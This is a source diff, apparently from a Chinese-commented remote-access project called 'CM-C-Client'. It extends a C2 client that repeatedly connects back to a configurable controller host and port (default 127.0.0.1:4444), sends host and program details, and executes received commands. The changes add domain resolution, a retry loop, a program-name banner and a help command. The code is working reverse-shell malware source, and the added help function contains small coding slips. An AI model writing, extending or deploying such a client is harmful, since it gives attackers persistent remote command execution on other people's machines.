@@ -49,9 +49,9 @@
 #endif
 #endif
 
-// 默认配置，可以根据需要修改 C2 的 IP 和端口
-#ifndef C2_IP
-    #define C2_IP "127.0.0.1"
+// 默认配置，可以根据需要修改 C2 的 IP/域名 和端口
+#ifndef C2_IP_DOMAIN
+    #define C2_IP_DOMAIN "127.0.0.1"
 #endif
 #ifndef C2_PORT
     #define C2_PORT 4444
@@ -241,7 +241,7 @@ const char *date_iso(void) {
     return buf;
 }
 
-// 上线后发送彩色Logo和当前程序信息到控制端
+// 上线后发送彩色Logo和当前程序信息和当前程序文件名到控制端
 int show_logo_info(int s) {
 
 #define RED     "\033[31m"
@@ -255,8 +255,16 @@ int show_logo_info(int s) {
 
 #define RESET   "\033[0m"
 
+    #ifdef _WIN32
+    // 获取当前程序的文件名
+    const char* Program_name = basename(__argv[0]);
+    #else
+    const char* Program_name = basename(argv[0]);
+    #endif
+
     char logo_buf[1024];  // logo 足够大的缓冲区
     char info_buf[512];  // info 足够大的缓冲区
+    char Program_name_buf[256] = {0};  // 程序名称缓冲区
     
     // 拼接彩色Logo字符串
     sprintf(logo_buf,
@@ -285,11 +293,31 @@ int show_logo_info(int s) {
         // GREEN, BOLD, PROJECT_URL, RESET, YELLOW, BOLD, ISSUE_URL, RESET, RESET,
     );
 
-    // 发送完整Logo和当前程序信息
+    sprintf(Program_name_buf, "\tCM-C-Client:%s\r\n", Program_name);
+
+    // 发送完整Logo和当前程序信息和当前程序文件名
     send(s, logo_buf, strlen(logo_buf), 0);
+    send(s, Program_name_buf, strlen(Program_name_buf), 0);
     send(s, info_buf, strlen(info_buf), 0);
 
     return 0;
+}
+
+int show_help_info(int s) {
+
+    char help_buf[1024];  //help足够大的缓冲区
+
+
+    sprintf(help_buf,
+        "CM-C-client function commands:\r\n"
+        "ip-info  -> get IP info in Public  network\r\n"
+        "cm-help  -> get help from CM-C\r\n",
+        "\r\n"
+        );
+
+        // 发送帮助信息
+        send(s, help_buf, strlen(help_buf), 0);
+
 }
 
 // 通过API根据受控端IP获取的信息
@@ -395,22 +423,36 @@ int main(int argc, char *argv[], char *envp[]) {
 
     while (1) {
         int s;
-        struct sockaddr_in addr;
-        addr.sin_family = AF_INET;
-        addr.sin_port = htons(C2_PORT);
-        addr.sin_addr.s_addr = inet_addr(C2_IP);
+        struct addrinfo hints, *result;
+        memset(&hints, 0, sizeof(hints));
+        hints.ai_family = AF_INET;
+        hints.ai_socktype = SOCK_STREAM;
+        
+        char port_str[16];
+        snprintf(port_str, sizeof(port_str), "%d", C2_PORT);
+        
+        if (getaddrinfo(C2_IP_DOMAIN, port_str, &hints, &result) != 0) {
+            #ifdef _WIN32
+            Sleep(5000);
+            #else
+            sleep(5);
+            #endif
+            continue;
+        }
 
         while (1) {
-            s = (int)socket(AF_INET, SOCK_STREAM, 0);
-            if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) >= 0) {
-                break; 
+            s = (int)socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+            if (connect(s, result->ai_addr, (int)result->ai_addrlen) >= 0) {
+                break;
             }
-#ifdef _WIN32
-            closesocket(s); Sleep(5000); 
-#else
+            #ifdef _WIN32
+            closesocket(s); Sleep(5000);
+            #else
             close(s); sleep(5);
-#endif
+            #endif
         }
+        
+        freeaddrinfo(result);
         
         show_logo_info(s);
 	char tip_buf[128];
@@ -422,10 +464,12 @@ int main(int argc, char *argv[], char *envp[]) {
             getcwd(path, sizeof(path));
 
             #ifdef _WIN32
-            // 获取当前程序的文件名
+            // 获取当前程序的文件名和获取当前程序所在的文件目录
             const char* Program_name = basename(__argv[0]);
+            const char* Program_dir = dirname(__argv[0]);
             #else
             const char* Program_name = basename(argv[0]);
+            const char* Program_dir = dirname(argv[0]);
             #endif
 
             // 获取当前的日期和时间
@@ -457,6 +501,11 @@ int main(int argc, char *argv[], char *envp[]) {
                 IP_INFO(s);
                 continue;  // * 务必加上 continue，防止命令被当作系统命令再次执行
             }
+
+        if (strcmp(buf, "cm-help") == 0) {
+            show_help_info(s);
+            continue;
+        }
             
             if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) {
                 send(s, "[-] Logout.\r\n", 12, 0);
